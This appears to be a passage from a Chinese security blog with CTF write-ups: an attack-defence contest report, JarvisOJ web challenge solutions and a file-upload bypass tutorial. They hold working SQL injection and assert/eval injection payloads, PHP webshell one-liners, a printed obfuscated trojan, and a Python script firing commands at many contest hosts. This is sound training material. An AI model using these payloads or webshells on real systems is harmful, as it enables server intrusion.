$cmd=$_POST['c']; $rsa = new Rsa(); $publicDecrypt = $rsa-&gt;publicDecrypt($cmd); eval($publicDecrypt); &#125;else&#123; echo '&lt;font size="700" color="red"&gt;Hacked By Smi1e!!!&lt;/font&gt;';&#125; 这RSA和双重md5看的我头皮发麻，看了一眼自己的@eval($_POST[‘t’])…… 其次就是这次比赛的表现跟自己准备的有些不一样，比赛前想的流程，结果比赛的时候依旧手忙脚乱的，第一个靶机测了SQL注入大半个小时，得到了一堆过滤的关键词，还想着怎样绕过去获取数据库内容： 过滤： or and | sleep benchmark union select - 逗号 () 结果呢，测完后看了下response header，才看到有个hint.txt文件： 1234567891011121314151617181920$sql="SELECT pwd FROM user WHERE uname = '&#123;$_POST['uname']&#125;'";$query = mysqli_query($con,$sql); if (mysqli_num_rows($query) == 1) &#123; $key = mysqli_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; echo "xxxxxxxxx"; &#125;else&#123; echo "你这密码不太对啊"; &#125;&#125;else if(mysqli_num_rows($query) == 0)&#123; echo "你这密码不太对啊";&#125;else&#123; echo "数据太多了";&#125; 这里要想绕过if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;])，需要用到mysql的group by xxx with rollup，该语句作用如下： with rollup: 在group分组字段的基础上再进行统计数据测试如下： mysql&gt; select * from usersss; +----+----------------------+----------+ | id | name | password | +----+----------------------+----------+ | 5 | biubiu | asdfg | | 1 | gtfly | 66666 | | 3 | gtfly | 1234321 | | 4 | biubiu | adfdf1 | | 2 | admin | 123qaz | | 6 | admin | newpass | | 7 | admin | assa | | 8 | admin | assa | | 9 | cat | miao | +----+----------------------+----------+ 9 rows in set (0.03 sec) mysql&gt; select count(name) from usersss group by name with rollup; +-------------+ | count(name) | +-------------+ | 4 | | 2 | | 1 | | 2 | | 9 | +-------------+ 5 rows in set (0.03 sec)可以看到，上面的最后一行的值为上面各行总和，但with rollup并不是计算总和的，它是根据前面查询所使用的函数来进行进一步的统计的；如果前面查询的内容没有用函数表示，那么会返回NULL： mysql&gt; select name from usersss group by name with rollup; +--------+ | name | +--------+ | admin | | biubiu | | cat | | gtfly | | NULL | +--------+ 5 rows in set (0.04 sec)由于这里if语句用的是弱等于，则可以让pwd字段值为空，使得NULL=&#39;&#39;，再在注入时使用group by pwd with rollup句式，即可使数据库中的pwd字段与post的pwd字段相等；还有在注入时需要绕过验证码，这一点跟ISCC线上赛的一道题是一样的，把cookie字段删掉，再把yzm字段置空即可 这里题目把or和|都给过滤了，但可以使用异或进行操作： mysql&gt; select name from usersss where name = 0; +----------------------+ | name | +----------------------+ | biubiu | | gtfly | | gtfly | | biubiu | | admin | | admin | | admin | | admin | | cat | +----------------------+ 9 rows in set, 9 warnings (0.00 sec)与下面使用异或操作是一样的： mysql&gt; select name from usersss where name = &apos;&apos; ^ &apos;&apos;; +----------------------+ | name | +----------------------+ | biubiu | | gtfly | | gtfly | | biubiu | | admin | | admin | | admin | | admin | | cat | +----------------------+ 9 rows in set, 11 warnings (0.00 sec)则构造payload： uname=&apos;^ &apos;&apos; group by pwd with rollup limit 1 offset 1#&amp;pwd=&amp;yzm=由于NULL会出现在最后一行，因此使用limit 1 offset 1获取最后一行数据： mysql&gt; select name from usersss where name = &apos;&apos; ^ &apos;&apos; limit 0,3; +--------+ | name | +--------+ | biubiu | | gtfly | | gtfly | +--------+ 3 rows in set, 5 warnings (0.00 sec)其与下面的句式功能是一样的： mysql&gt; select name from usersss where name = &apos;&apos; ^ &apos;&apos; limit 3 offset 1; +--------+ | name | +--------+ | gtfly | | gtfly | | biubiu | +--------+ 3 rows in set, 6 warnings (0.00 sec)由于这里过滤了逗号，因此需要使用limit x ofsset x的句式，这里尝试了limit 1 offset 1，发包发现成功，返回经utf-7编码的shell地址： +ADg-d+ADIAMA-d+ADUANw-e+ADI-f+ADIAYgA5AGI-e+ADUALw-f+AGIAMwAw-e+ADcAMA-f+ADcAOAAxADMANAA4ADk-dd+AGE-e+ADcAOQBi-e+ADAANwA5ADIANQBhADMANABhAC4AcABoAHA-访问路径，得到shell源码： 12345&lt;?phpshow_source(__FILE__);$a = @$_REQUEST['a'];@eval("var_dump($$a);");?&gt; 利用变量覆盖和闭合括号，即可达到任意命令执行： ?a=a=1);system(&apos;getflag&apos;);//即可得到flag 之后举手，拿到高地权限，可以攻打其他队伍了，不过其他队伍的ip真的是一点规律都没有，就想着把excel里的ip给提取出来，写的真是手忙脚乱，用python提取数据，写了一会发现写不出(菜的真实)，后来累个半死，把所有ip都手动整理到脚本里面，，；还有比较坑的就是，拿到其他靶机权限后，自己的token只能执行一次，之后就会刷新，，所以还要不断的获取自己的token，最终脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119import requestsimport re#自己的shell利用payload # http://192.168.52.74/8d20d57e2f2b9be5/fb30e70f7813489ddae79be07925a34a.php?a=a=1);system(%27getflag%27);//port = '80' # 可变，端口号headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36', 'Cookie': 'MacaronSession=947e88773bdd2e69' &#125;#print(res.text)for i in ['192.168.31.35', '192.168.31.82', '192.168.31.100', '192.168.31.149', '192.168.32.61', '192.168.32.92', '192.168.32.103', '192.168.32.144', '192.168.33.47','192.168.33.93','192.168.33.121','192.168.33.145','192.168.34.57','192.168.34.72','192.168.34.107','192.168.34.137','192.168.35.35','192.168.35.94','192.168.35.110','192.168.35.141','192.168.36.39','192.168.36.91','192.168.36.122','192.168.36.134','192.168.37.36','192.168.37.70','192.168.37.104','192.168.37.141','192.168.38.55','192.168.38.91','192.168.38.107','192.168.38.154','192.168.39.55','192.168.39.85','192.168.39.100','192.168.39.149','192.168.40.61','192.168.40.82','192.168.40.122','192.168.40.139','192.168.41.41','192.168.41.68','192.168.41.110','192.168.41.150','192.168.42.47','192.168.42.85','192.168.42.105','192.168.42.146','192.168.43.50','192.168.43.66','192.168.43.122','192.168.43.147','192.168.44.36','192.168.44.89','192.168.44.101','192.168.44.153','192.168.45.48','192.168.45.78','192.168.45.102','192.168.45.134','192.168.46.53','192.168.46.87','192.168.46.99','192.168.46.156','192.168.47.54','192.168.47.90','192.168.47.99','192.168.47.155','192.168.48.54','192.168.48.83','192.168.48.114','192.168.48.133','192.168.49.40','192.168.49.82','192.168.49.116','192.168.49.132','192.168.50.52','192.168.50.90','192.168.50.118','192.168.50.131','192.168.51.53','192.168.51.70','192.168.51.98','192.168.51.157','192.168.52.36','192.168.52.74','192.168.52.115','192.168.52.154','192.168.53.56','192.168.53.88','192.168.53.103','192.168.53.132','192.168.54.50','192.168.54.66','192.168.54.111','192.168.54.140']: res = requests.get('http://172.16.100.5:4000/profile', headers=headers) sig = re.findall('&lt;td&gt;&lt;strong id="team-sig"&gt;(.*?)&lt;/strong&gt;', res.text)[0] #print(sig) path = "/8d20d57e2f2b9be5/fb30e70f7813489ddae79be07925a34a.php?a=a=1);system('hereiam -t &#123;&#125;');//".format(sig) url = "http://&#123;&#125;:".format(i) + port + path try: res = requests.get(url) if res.status_code == 200: print(url + " connect shell success,resulr is: " + res.text) else: print("res.status_code:", res.status_code) except Exception as e: print(url + " connect shell fail: ", e) 最后也只拿到了差不多四轮的分数，如果自己处理数据的速度能够再快点就能多拿点分数了，唉，唉唉唉 第二个靶机也不知道哪里存在漏洞，最傻的就是开始一直在盯着页面的Hello World看，看半天什么源码、cookie、UA测了一遍啥也没有，看了几十分钟才想起来要扫端口。。。。 这次比赛虽然主办方有问题，但依旧有其他队伍拿到很高的分数，菜才是原罪啊！继续努力555555555555 参考链接：https://www.freebuf.com/column/185591.htmlhttps://cloud.tencent.com/developer/article/1345742]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[JavisOJ WEB之旅]]></title>
    <url>%2F2019%2F06%2F13%2FJavisOJ-WEB%E4%B9%8B%E6%97%85%2F</url>
    <content type="text"><![CDATA[定个小目标，最近要把Javis的web题刷通关~ babyphp题目地址：http://web.jarvisoj.com:32798 拿到题目后，点击Home，参数变成?page=home，点击About，参数变成?page=about，推测有文件包含漏洞，但使用php://filter协议后发现行不通 在About页面发现： 昨儿做梦的时候我在梦里写了这个网站 印象中我用了这些东西: PHP GIT Bootstrap则推测有git泄露，扫描后果然有，将源码下载了下来，结构如下： /templates/ about.php contact.php flag.php home.php /index.php查看flag.php，发现什么也没有，查看源代码，可以看出关键代码： 123456789101112&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");assert("file_exists('$file')") or die("That file doesn't exist!");require_once $file;?&gt; 这里考察了assert()函数的用法： assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动； 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行；如果 assertion 失败了，选项 description 将会包括在失败信息里。 PHP 5 bool assert( mixed $assertion[, string $description] )PHP 7 bool assert( mixed $assertion[, Throwable $exception] ) 这里我们只需要闭合引号，便可在其后任意执行命令了： payload1 page=&apos;,&apos;..&apos;)===false and show_source(&apos;templates/flag.php&apos;);//那么assert函数参数内容为： assert(&quot;strpos(&apos;templates/&apos;, &apos;..&apos;)===false and show_source(&apos;templates/flag.php&apos;);//.php&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);payload2 page=&apos; and show_source(&apos;templates/flag.php&apos;) or &apos;assert函数参数内容为： assert(&quot;strpos(&apos;templates/&apos; and show_source(&apos;templates/flag.php&apos;) or &apos;.php&apos;,&apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);IN A MESS题目链接：http://web.jarvisoj.com:32780 打开题目，查看源码发现路径index.phps： 12345678910111213141516171819202122&lt;?phpif(!$_GET['id']) &#123; header('Location: index.php?id=1'); exit(); &#125; $id=$_GET['id']; $a=$_GET['a']; $b=$_GET['b']; if(stripos($a,'.')) &#123; echo 'Hahahahahaha'; return ; &#125; $data = @file_get_contents($a,'r'); if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) &#123; require("flag.txt"); &#125; else &#123; print "work harder!harder!harder!"; &#125; ?&gt; 1.伪协议绕过 $data = @file_get_contents($a,&apos;r&apos;); if($data==&quot;1112 is a nice lab!&quot; 得出$a要为php://input协议，且要post1112 is a nice lab! 2.弱类型绕过 if(!$_GET[&apos;id&apos;]) { header(&apos;Location: index.php?id=1&apos;); exit(); } if(... and $id==0得出$id可以用弱类型绕过$id=0a 3.截断绕过 if(... strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)由eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)得到$b在匹配模式中，那么$b的第一个字符要么为4，要么为空；由substr($b,0,1)!=4)得到$b的第一个字符不能等于4 那么让$b的第一个字符为空即可： $b=%0012345得到： Come ON!!! {/^HT2mCpcvOLf}进入到这个路径，发现是一个注入题，有三种回显： id=1时，显示hi666 id不等于1时，显示查询的语句 id后参数有空格时，显示you bad boy/girl! 还发现过滤了/**/，select，union，select，from，但后三个字符串都可以通过双写绕过；虽然把/**/过滤了，但可以在星号中间加上其他字符来绕过 查询表： ?id=0/*1*/uniounionn/*1*/selecselectt/*1*/1,2,(selecselectt/*1*/group_concat(table_name)frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema=database())得到表：content 查询字段： ?id=0/*1*/uniounionn/*1*/selecselectt/*1*/1,2,(selecselectt/*1*/group_concat(column_name)frfromom/*1*/information_schema.columns/*1*/where/*1*/table_schema=database())得到字段：id,context,title 查询flag： ?id=0/*1*/uniounionn/*1*/selecselectt/*1*/1,2,(selecselectt/*1*/context/*1*/frofromm/*1*/content)Login一个输入框，在响应头中获取到hint： &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;流程： 输入$pass-&gt;经md5后会转为16进制-&gt;mysql处理16进制时会自动将其转换为ascii字符串由于需要构造password=&#39;&#39;or &#39;&#39;这种形式，则找到一个字符串，使它的md5值转化为字符串后出现两个&#39;和or，即可绕过。这里找到了一个符合要求的字符串ffifdyop： mysql&gt; select md5(&apos;ffifdyop&apos;); +----------------------------------+ | md5(&apos;ffifdyop&apos;) | +----------------------------------+ | 276f722736c95d99e921722cf9ed621c | +----------------------------------+ 1 row in set (0.06 sec) mysql&gt; select 0x276f722736c95d99e921722cf9ed621c; +------------------------------------+ | 0x276f722736c95d99e921722cf9ed621c | +------------------------------------+ | &apos;or&apos;6蒥欓!r, | +------------------------------------+ 1 row in set (0.00 sec)Chopper有个管理员登录的链接，不过点击后会弹出you are not admin!的提示；查看根目录页面源代码，看到一个链接： &lt;img src=&quot;proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg&quot; alt=&quot;&quot;&gt;查看/admin页面源代码，看到一个提示： &lt;!--&lt;script&gt;alert(&apos;admin ip is 202.5.19.128&apos;)&lt;/script&gt;--&gt;之后扫文件目录也扫不出东西，真想看看源码是什么。。。看wp构造payload： http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/robots.txt发现有两个文件： User-agent: * Disallow:trojan.php Disallow:trojan.php.txt访问txt文件，得到trojian.php源码： 1234&lt;?php $&#123;("#"^"|").("#"^"|")&#125;=("!"^"`").("( "^"&#123;").("("^"[").("~"^";").("|"^".").("*"^"~");$&#123;("#"^"|").("#"^"|")&#125;(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("&#125;"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&amp;"). ("#"^"p"). ("&gt;"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?&gt; 这里存在着php的几个特性： 1.特殊的变量名可以用{}括起来，大括号里面可以是表达式，如本题的${(&quot;#&quot;^&quot;|&quot;).(&quot;#&quot;^&quot;|&quot;)}实际上是${__}2.函数名是不区分大小写的，如本题在本地测试，上述字符串运行后实际上是： ${__} = ASsERT; ${__}(eval($_POST[360]));注：php的方法名、类名、函数名都是不区分大小写的 之后用菜刀连接即可看到flag Easy Gallery扫描得到文件结构： /index.php /main.php /upload.php：上传点，上传成功返回图片id /view.php：输入图片id和type查看图片 /uploads/：在路径后跟上图片id和后缀可直接访问图片上传后缀为.php，发现提示 alert(&apos;上传照片只能是JPG或者GIF！&apos;);history.go(-1)将后缀改为.xyz，依旧不能上传，则推断后端为白名单检测 将后缀改为jpg，内容改为php一句话木马，发现仍不能上传；推测检测后缀的同时，还检测文件头，将文件头添加到代码前，发现可以上传成功 既然只能上传图片马，那就需要考虑如何去利用；注意到了点击Submit时，url变成/index.php?page=submit，点击View时，页面变成/index.php?page=view 那么将参数page的值改为flag，报出错误信息： 由此可知fopen的文件名是page后的参数+.php；要想办法将自己上传的图片马用fopen函数打开，可以利用00截断(这里有个小坑，稍后会提)： ?page=uploads/1561905539.jpg%00但页面显示You should not do this!，看来马被检测出来了，将php代码内容清空上传：&lt;?php ?&gt;，结果还是这样；那么换一种马的写法： &lt;script language=php&gt;@eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;之后页面无显示内容，用菜刀连接，拿到flag 参考链接：https://www.360zhijia.com/anquan/418538.htmlhttp://dldxz.cn/2019/03/17/Jarvis-OJ-web-wp]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2019%2F06%2F13%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[最近参考了很多文章，结合以前整理的把文件上传的知识重新总结了一下，除了下面列举的这些姿势外(当然，有的还没列举到)，比赛中常见的形式就是上传题会结合源码泄露进行分析绕过。 上传时需要注意： 服务器类型、后端语言及版本 是黑名单上传还是白名单上传 是否可以获得上传路径、上传的文件是否被改名或被删除、被渲染了 什么是文件上传漏洞文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令或影响服务端正常工作等能力。 上传的文件发挥其作用需要具备以下几个条件： （1）上传的文件具备可执行性； （2）用户可以从Web上访问这个文件，从而使得Web容器解释执行该文件；(就是你可以访问到你上传的这个文件) （3）上传后的文件必须经过安全检查，不会被格式化、压缩等处理改变其内容；(文件的内容不会被修改) 文件上传-Multipart/form-data对于普通的HTML Form POST请求，它会在头信息里使用Content-Length注明内容长度。头信息每行一条，空行之后便是Body，即“内容”（entity）。它的Content-Type是application/x-www-form-urlencoded，这意味着消息内容会经过URL编码 最早的HTTP POST是不支持文件上传的；后来Content-Type的类型扩充了multipart/form-data用以支持向服务器发送二进制数据 用burp抓到文件上传的部分信息如下： Content-Length: 315 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTUDdEg7S0viQZNs5 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: http://123.206.87.240:8002/web9/index.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: td_cookie=2691609149; td_cookie=2955167419 ------WebKitFormBoundaryTUDdEg7S0viQZNs5 Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;caidao.php&quot; Content-Type: image/png &lt;?php @eval($_POST[&apos;pass&apos;]);?&gt; ------WebKitFormBoundaryTUDdEg7S0viQZNs5 Content-Disposition: form-data; name=&quot;submit&quot; Submit ------WebKitFormBoundaryTUDdEg7S0viQZNs5--第一个空行前时HTTP header，后面则是entity，即内容 需要选择一段数据作为“分割边界”（boundary属性），这个“边界数据”不能在内容其他地方出现，每次post浏览器都会生成一个随机的30-40位长度的随机字符串 选择了这个边界之后，浏览器便把它放在Content-Type里面传递给服务器，服务器根据此边界解析数据。下面的数据便根据boundary划分段，每一段便是一项数据。(每个field被分成小部分，而且包含一个value是”form-data”的”Content-Disposition”的头部；一个”name”属性对应field的ID,等等，文件的话包括一个filename) 客户端javascript 检测(通常为检测文件扩展名)上传时，数据还没有发送出去，浏览器就已经弹出警示框，说明数据还没有发送给服务器，程序就判断出来文件类型不对，因此就可以得出结论这个是通过客户端进行的本地文件检测 这类检测通常在上传页面里含有专门检测文件上传的javascript 代码,最常见的就是检测扩展名是否合法。 绕过方法 1.上传时使用Burpsuite拦截数据包，将木马的扩展名改为原来的php,即可绕过客户端的验证。 2.通过console控制台更改js代码 服务端检测绕过0x00.php文件上传相关函数及相关配置$_FILES 参数详解以下$_FILES[&quot;file&quot;]中的file表示表单中设置的name的值 $_FILES[“file”][“name”] – 被上传文件的名称 $_FILES[“file”][“type”] – 被上传文件的类型，即MIME类型 $_FILES[“file”][“size”] – 被上传文件的大小，以字节计；$_FILES[“file”][“size”]/1024 即表示以kb为文件大小单位 $_FILES[“file”][“tmp_name”] – 存储在服务器的文件的临时副本的名称；在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），这个临时文件在请求结束后就会被删除，因此上传时需要将临时文件移动到某个文件夹下，文件才能被保存到服务器上；这一特性在其他地方如文件包含或命令执行也可能给会被用到； $_FILES[“file”][“error”] – 由文件上传导致的错误代码 is_uploaded_file()函数用法： is_uploaded_file ( string $filename ) : bool1.is_uploaded_file() 函数检查指定的文件是否是通过 HTTP POST 上传的；2.如果是POST的话则返回TRUE，否则返回FALSE3.is_uploaded_file[“file”][“tmp_name”]即检查上传的文件是否是POST方式提交的 move_uploaded_file()函数用法： bool move_uploaded_file( string $filename, string $destination): bool1.该函数将上传的文件移动到新位置；2.成功移动返回TRUE，移动失败返回FALSE；3.如果目标文件已经存在，则会被覆盖；4.目标路径必须存在；如果目标路径不存在，该函数不会去自动创建；该文件夹需要有可写权限 pathinfo()函数用法： pathinfo ( string $path [, int $options = PATHINFO_DIRNAME | PATHINFO_BASENAME | PATHINFO_EXTENSION | PATHINFO_FILENAME ] ) : mixed1.该函数返回一个关联数组包含有path的信息；path为要解析的路径；如果指定了options，将会返回指定元素；它们包括：PATHINFO_DIRNAME，PATHINFO_BASENAME 和 PATHINFO_EXTENSION 或 PATHINFO_FILENAME；如果没有指定 options 默认是返回全部的单元。 max_execution_timephp配置中默认的： max_execution_time = 30即文件上传最久执行时间为30s，超过30s脚步就停止执行； 可以修改上述配置，也可以直接在脚本中加入下面的函数来设定页面最久执行时间： set_time_limit(0); //无限制post_max_size该配置设定POST数据所允许的最大大小 upload_max_filesize该配置设定上传文件的最大大小 0x01.服务端MIME类型检测(检测Content-Type 内容)当用户上传文件到服务器端的时候，服务器端的程序会获取上传文件的MIME类型，然后用这个获取到的类型来和期望的MIME类型进行匹配，如果匹配不上则说明上传的文件不合法。 MIME类型是什么？ 在把输出结果传送到浏览器上的时候，浏览器必须启动应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。在HTTP中，MIME类型被定义在Content-Type header中。 常见的MIME类型： .html text/html .txt text/plain .gif image/gif .jpg image/jpeg .png image/png 绕过方法 设置检测文件的类型，可以通过burpsuite来修改文件的类型进行过滤即可 小技巧：如果允许上传jpg类型的文件，则可以先将木马后缀加上.jpg，上传时抓包，拦截得到的Content-Type为jpg类型，再将.jpg去掉即可。这样就不用去修改Content-Type类型了 0x02.0x00截断当文件系统读到0x00时，会认为文件名已经结束。 上传路径可控使用0x00截断需要满足以下条件： php版本小于5.3.4 php的magic_quotes_gpc为OFF状态如果文件后缀被白名单限制为.jpg，但上传路径可控： $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;则在路径中，可以使用0x00截断的方法： POST /Pass-11/index.php?save_path=../upload/yijuhua.php%00 HTTP/1.1 Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;yijuhua.jpg&quot;则上传的文件名会以yijuhua.php形式存放到../upload中 如果路径是以$_POST方式传递的，则需要将.替换成0x00，而不是%00，因为POST传递的值不会经URL解码，具体方法： 使用burp，抓到数据后点开hex，将倒数第一个小数点对应的2e改成00即可 move_uploaded_file() （CVE-2015-2348）漏洞影响版本必须在5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7 如果文件上传代码中有： if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)那么可用0x00截断的方法： move_uploaded_file($_FILES[&apos;name&apos;][&apos;tmp_name&apos;],&quot;/file.php\x00.jpg&quot;);这本应该创建一个名为file.php\x00.jpg的文件，但实际上创建的文件是file.php 0x03.Apache文件解析特性多后缀名Apache对于文件名的解析是从后往前解析的，直到遇见一个Apache认识的文件类型为止 如： hello.php.rar.rar.rarApache不认识.rar这个文件类型，会一直遍历到.php 测试环境：windows10，Apache/2.4.23，PHP/5.5.38 在phpstudy网站目录存放一张a.jpg图片，将其改名为a.jpg.abc，再用浏览器去访问这张图片，发现被成功解析为图片： 那么现在在网站目录存放一个ma.php文件，里面内容为： &lt;?php echo &apos;good&apos;; ?&gt;再将其改名为ma.php.abc，访问这个文件： 发现其并没有被解析，而是直接将里面的内容显示了出来，这是因为Apache本身并不懂php，而是将这个文件交给php解释器，php解释器和Apache有着不同的解析规则； 在phpStudy\PHPTutorial\Apache\conf\extra找到httpd-php.conf这个配置文件，打开可以看到 &lt;FilesMatch &quot;\.php$&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;我们可以知道，只有当文件名后缀为.php时，文件才能被当做php执行，那么现在将其改为： &lt;FilesMatch &quot;\.php\.&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;重启phpstudy，可以看到ma.php.abc已经可以被解析了： 罕见后缀在某些情况下，不只是php，就连phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀 .htaccessApache提供了一种很方便的、可作用于当前目录及其子目录的分布式配置文件：.htaccess 要使.htaccess文件生效，需要在Apache的配置文件中写上(这里我的配置文件中默认就有以下配置)： AllowOverride All LoadModule rewrite_module modules/mod_rewrite.so之后，我们测试用.htaccess文件修改php解释器配置： 新建一个.htaccess文件，由于windows不支持文件名以小数点开头，需要用到cmd命令： echo &gt; .htaccess这样即可生成.htaccess文件；在这个文件里面写入： &lt;FilesMatch &quot;xxx&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;即让php解释器将文件名中含有xxx的文件解析为php 在此.htaccess目录创建a.xxx文件，在里面写入： &lt;?php echo &apos;good&apos;; ?&gt;发现其被解析成了php： 将a.xxx改名为xxx.abc，也是会被解析为php的 0x04.IIS6.0解析特性IIS6.0属于winserver下的服务器 asp即 active server pages，是microsoft公司开发的服务端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序 1.目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析 2.文件名中如果包含.asp;、.asa;、.cer;则优先使用asp解析，如asa.asa;asa.jpg 0x05.Nginx解析特性1.Nginx版本： Nginx 0.5.* Nginx 0.6.* Nginx 0.7 &lt;= 0.7.65 Nginx 0.8 &lt;= 0.8.37以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求 2.Nginx版本： Nginx 0.8.41 – 1.5.6：以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求 0x06.PHP CGI解析漏洞版本： IIS 7.0/7.5 Nginx &lt; 0.8.3以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析 0x07 .user.ini不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以使用.user.ini php.ini是php默认的配置文件，其中包含了很多php的配置，.user.ini实际上就是一个可以由用户自定义的php.ini 测试环境：windows10，PHPStudy php-5.6.27-nts+Nginx 在网站根目录创建一个.user.ini文件(cmd echo &gt; .user.ini)，写入： auto_append_file=test.jpg之后创建一个test.jpg文件： 12345&lt;?phpif(@$_GEET['shell'] == 'test')&#123; phpinfo();&#125;?&gt; 之后，访问正常的php文件： 127.0.0.1/index.php加上参数： 127.0.0.1/index.php?shell=test即可看到页面执行了phpinfo 0x08.条件竞争Web服务器处理多用户请求时，是并发进行的，如果并发处理不当或者是相关的逻辑操作设计的不合理时，就可能导致条件竞争漏洞。 例如：将文件上传到服务器，然后检查上传的文件的类型，如果不符合条件就删除。 但是，如果我们采用多线程的方式访问上传的文件，总有一次我们在文件删除之前就访问到了这个文件，如果这个文件是php的一句话木马，就在服务器中执行了这个木马 具体方法： 使用burp intruder，在payload中选择Null payloads，在下面Generate后输入请求次数，之后点击start attack，即可不断的上传文件 0x09.后缀检测不完全1.后缀名大小写绕过如果在与黑名单比较前没有将后缀进行大小写统一的话： # $file_ext = strtolower($file_ext); //转换为小写可以通过大小写绕过： .pHp .PHP ...2.在后缀名后加空格如果在与黑名单比较前没有将文件名首尾去空的话： # $file_ext = trim($file_ext); //首尾去空可以通过在文件名后加空格绕过： filename=&quot;yijuhua.php &quot;3.后缀名双写绕过如果是黑名单且过滤机制仅仅是替换一次不合法后缀： $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);可以进行双写绕过： filename=&quot;yijuhua.pphphp&quot;str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。 函数用法： str_ireplace(find,replace,string,count) find 必需。规定要查找的值。 replace 必需。规定替换 find 中的值的值。 string 必需。规定被搜索的字符串。 count 可选。一个变量，对替换数进行计数。0x11.Windows解析特性文件后缀的点如果服务器是windows系统，且在与黑名单比较前没有将文件后缀的点进行过滤： # $file_name = deldot($file_name);//删除文件名末尾的点可以在文件名后加点后再上传： filename=&quot;yijuhua.php.&quot;windows服务器收到这个文件后，会自动忽略掉后面的点 结合0x06，如果过滤机制如下： $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空可以在文件名后加点+空格+点： filename=&quot;yijuhua.php. .&quot;::$DATA如果服务器是windows系统，且在与黑名单比较前没有将文件名中的::$DATA去除： # $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA可以在文件名后加上这个字符串再上传： filename=&quot;yijuhua.php::$DATA&quot;php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理 0x10.file_put_contents()与file_exists()特性&lt;?php $filename = __DIR__ . &apos;/tmp/&apos; . $_GET[&apos;name&apos;]; $data = $_GET[&apos;info&apos;]; file_put_contents($filename, $data); // ...一些处理 if (file_exists($filename)) { unlink($filename); } ?&gt;unlink — 删除文件 bool unlink( string $filename[, resource $context] )方法一.条件竞争方法二.函数特性ph大佬总结的： 查看php源码，其实我们能发现，php读取、写入文件，都会调用php_stream_open_wrapper_ex来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。 